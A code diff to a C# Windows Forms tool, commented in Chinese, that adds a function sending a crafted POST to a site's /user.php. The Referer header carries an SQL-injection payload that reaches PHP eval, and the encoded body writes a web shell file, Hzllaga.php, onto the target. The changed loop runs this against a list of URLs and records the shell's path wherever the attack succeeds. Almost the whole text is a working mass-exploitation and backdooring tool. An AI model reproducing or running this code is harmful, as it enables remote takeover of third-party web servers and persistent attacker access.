@@ -52,6 +52,30 @@ namespace WindowsFormsApplication5
             return res;
         }
 
+        public static string Exploit2(string URL) //漏洞关键函数
+        {
+            string res = string.Empty;//清空请求结果,请求类型不是图片时有效
+            string pdata = "Hzllaga=eval/**/(base64_decode($_POST[d]));echo HzllagaRCETestOK;exit;&d=ZmlsZV9wdXRfY29udGVudHMoJ0h6bGxhZ2EucGhwJywnPD9waHAgZXZhbCgkX1JFUVVFU1RbSHpsbGFnYV0pOz8%2BJyk7";//提交数据(必须项)
+
+            System.Net.CookieContainer cc = new System.Net.CookieContainer();//自动处理Cookie对象
+            HttpHelpers helper = new HttpHelpers();//发起请求对象
+            HttpItems items = new HttpItems();//请求设置对象
+            HttpResults hr = new HttpResults();//请求结果
+            items.URL = URL + "/user.php";//请求的url地址
+            items.Timeout = 5000;
+            items.Referer = "45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:\"num\";s:207:\"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b24487a6c6c616761275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262534870736247466e595630704f773d3d2729293b2f2f7d7d,0--\";s:2:\"id\";s:9:\"' union/*\";s:4:\"name\";s:3:\"ads\";}45ea207d7a2b68c49582d2d22adf953a"; //referer头,如果需要请填写
+            items.Accept = "*/*";
+            items.UserAgent = "curl/7.35.0";
+            items.ContentType = "application/x-www-form-urlencoded";
+            items.Container = cc;//自动处理Cookie时,每次提交时对cc赋值即可
+            items.Postdata = pdata;//提交的数据
+            items.Method = "Post";//设置提交方式为post方式提交(默认为Get方式提交)
+            hr = helper.GetHtml(items);//发起请求并获得结果
+            res = hr.Html;//得到请求结果
+
+            return res;
+        }
+
         string[] url;
         List<string> listurl = new List<string>();
         List<string> listurlok = new List<string>();
@@ -143,8 +167,29 @@ namespace WindowsFormsApplication5
                 }
                 else
                 {
-                    listView1.Items[b.i].SubItems[1].Text = "网站不存在漏洞或存在WAF！";
-                    progressBar1.Value++;
+                    string res2 = Exploit2(text); //执行PoC
+
+                    if (res2.IndexOf("HzllagaRCETestOK") > -1) //判断返回，确定是否存在漏洞
+                    {
+                        if (res2.IndexOf("Permission denied") > -1)
+                        {
+                            listView1.Items[b.i].SubItems[1].Text = "网站存在漏洞，但没权限写入。";
+                            progressBar1.Value++;
+
+                        }
+                        else
+                        {
+                            listView1.Items[b.i].SubItems[1].Text = text + "/Hzllaga.php";
+                            progressBar1.Value++;
+
+                        }
+                    }
+                    else
+                    {
+                        listView1.Items[b.i].SubItems[1].Text = "网站不存在漏洞或存在WAF！";
+                        progressBar1.Value++;
+
+                    }
 
                 }
             }
